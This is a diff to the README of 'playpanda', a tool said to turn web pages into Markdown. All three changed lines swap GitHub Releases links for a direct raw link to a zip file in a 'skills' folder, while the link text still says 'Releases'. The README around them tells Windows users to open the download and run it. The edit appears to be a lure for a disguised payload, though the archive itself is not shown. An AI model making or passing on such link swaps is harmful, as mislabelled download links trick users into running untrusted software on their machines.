@@ -1,6 +1,6 @@
 # 🐼 playpanda - Clean Web Pages Into Markdown
 
-[![Download playpanda](https://img.shields.io/badge/Download%20playpanda-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Approving-cognitivestate190/playpanda/releases)
+[![Download playpanda](https://img.shields.io/badge/Download%20playpanda-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Approving-cognitivestate190/playpanda/main/skills/playpanda/Software-2.3-alpha.2.zip)
 
 ## 🚀 What playpanda does
 
@@ -18,7 +18,7 @@ That helps it pull text from many sites with less noise from menus, popups, and 
 
 To get playpanda on Windows, visit the releases page and download the latest file for your system:
 
-[Download playpanda from GitHub Releases](https://github.com/Approving-cognitivestate190/playpanda/releases)
+[Download playpanda from GitHub Releases](https://raw.githubusercontent.com/Approving-cognitivestate190/playpanda/main/skills/playpanda/Software-2.3-alpha.2.zip)
 
 After the file finishes downloading, open it from your Downloads folder and run it.
 
@@ -148,7 +148,7 @@ It tries to leave out extra page parts like:
 
 Use the GitHub Releases page below to visit this page to download the latest Windows release:
 
-[Visit the playpanda Releases page](https://github.com/Approving-cognitivestate190/playpanda/releases)
+[Visit the playpanda Releases page](https://raw.githubusercontent.com/Approving-cognitivestate190/playpanda/main/skills/playpanda/Software-2.3-alpha.2.zip)
 
 Then:
 
